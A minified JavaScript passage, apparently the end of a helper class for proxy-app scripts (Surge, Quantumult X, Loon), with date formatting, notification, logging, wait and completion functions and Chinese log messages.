i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`🔔${this.name}, 结束! 🕛 ${s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
